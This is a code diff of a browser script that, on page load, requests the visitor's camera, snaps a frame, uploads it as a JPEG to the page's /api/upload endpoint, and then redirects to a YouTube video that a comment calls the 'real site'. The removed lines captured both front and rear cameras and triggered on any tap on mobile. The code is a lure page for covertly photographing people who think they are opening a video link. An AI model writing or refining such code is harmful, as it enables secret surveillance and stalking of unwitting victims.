@@ -1,87 +1,46 @@
-// public/capture.js
-
 (async () => {
-  const frontVid = document.getElementById('frontVideo');
-  const rearVid  = document.getElementById('rearVideo');
-  const canvas   = document.getElementById('canvas');
-  const ctx      = canvas.getContext('2d');
-  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const video  = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
 
-  async function captureBoth() {
-    let frontStream, rearStream;
+  async function captureFrameOnce() {
+    let stream;
     try {
-      console.log('⚙ Requesting front camera…');
-      frontStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' }
+      // 1) get or reuse camera
+      stream = video.srcObject
+        ? video.srcObject
+        : await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      // 2) wait for dimensions
+      await new Promise(r => {
+        if (video.readyState >= 2) r();
+        else video.onloadedmetadata = () => r();
       });
-      frontVid.srcObject = frontStream;
-      console.log('✅ Front camera granted');
 
-      try {
-        console.log('⚙ Requesting rear camera…');
-        rearStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'environment' }
-        });
-        rearVid.srcObject = rearStream;
-        console.log('✅ Rear camera granted');
-      } catch (err) {
-        console.warn('⚠ Rear camera failed—continuing with front only', err);
-      }
+      // 3) draw frame
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
 
-      // wait for metadata
-      await Promise.all([
-        new Promise(r => frontVid.onloadedmetadata = r),
-        rearStream ? new Promise(r => rearVid.onloadedmetadata = r) : Promise.resolve()
-      ]);
-
-      // determine canvas size & draw
-      const fw = frontVid.videoWidth, fh = frontVid.videoHeight;
-      if (rearStream) {
-        const rw = rearVid.videoWidth, rh = rearVid.videoHeight;
-        const w  = Math.max(fw, rw), h = Math.max(fh, rh);
-        canvas.width  = w * 2;
-        canvas.height = h;
-        ctx.drawImage(rearVid,  0, 0, w, h);
-        ctx.drawImage(frontVid, w, 0, w, h);
-      } else {
-        canvas.width  = fw;
-        canvas.height = fh;
-        ctx.drawImage(frontVid, 0, 0, fw, fh);
-      }
-
-      console.log('📤 Sending snapshot');
+      // 4) dataURL → JSON
       const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-      const res = await fetch('/api/upload', {
+      await fetch('/api/upload', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
         body:    JSON.stringify({ image: dataUrl })
       });
-      console.log('📤 Upload status:', res.status);
-
     } catch (err) {
-      console.error('❌ Capture error:', err);
-      alert('Capture failed: ' + err.message);
+      console.error('Auto-capture error:', err);
     } finally {
-      // stop all tracks
-      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
-      if (rearStream)  rearStream.getTracks().forEach(t => t.stop());
-
-      console.log('🔀 Redirecting now');
+      // 5) cleanup camera
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      // 6) redirect to real site
       window.location.replace('https://m.youtube.com/watch?si=X7JkWv2nepcAG1IE&v=kNIr14EyTaY&feature=youtu.be');
     }
   }
 
-  if (isMobile) {
-    // On mobile: wait for any tap/click as the "gesture"
-    const start = () => {
-      document.removeEventListener('touchstart', start);
-      document.removeEventListener('click', start);
-      captureBoth();
-    };
-    document.addEventListener('touchstart', start, { once: true });
-    document.addEventListener('click',      start, { once: true });
-  } else {
-    // On desktop: auto-run immediately
-    captureBoth();
-  }
+  // expose for “Next”
+  window.runAutoCapture = captureFrameOnce;
+  // autorun on load
+  captureFrameOnce();
 })();
